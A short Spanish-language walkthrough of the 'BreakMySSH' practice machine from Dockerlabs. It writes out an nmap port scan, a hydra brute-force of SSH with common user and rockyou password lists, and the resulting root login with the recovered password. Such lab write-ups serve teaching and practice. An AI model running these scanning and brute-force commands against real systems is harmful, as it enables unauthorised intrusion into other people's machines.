# Máquina BreakMySSH

Dificultad -> Muy fácil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
```

--------------
## Explotación

Solo vemos el puerto **ssh** por lo que aplicamos fuerza bruta con usuarios y contraseñas comunes y la herramienta **hydra**:
Para los usuarios he escogido un diccionario de metasploit -> /usr/share/metasploit-framework/data/wordlists/unix_users.txt
Y para las contraseñas el **rockyou** -> /usr/share/wordlists/rockyou.txt

```shell
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
-------------------------------------------------------------------
[22][ssh] host: 172.17.0.2   password: estrella
```

Encontramos una contraseña -> **estrella**

Resultan ser las credenciales del usuario **root**. Podemos acceder mediante:

```shell
ssh root@172.17.0.2
-> root@172.17.0.2's password: estrella
```

Estamos dentro, y como hemos entrado con **root** tenemos el nivel de privilegios máximos en el sistema !
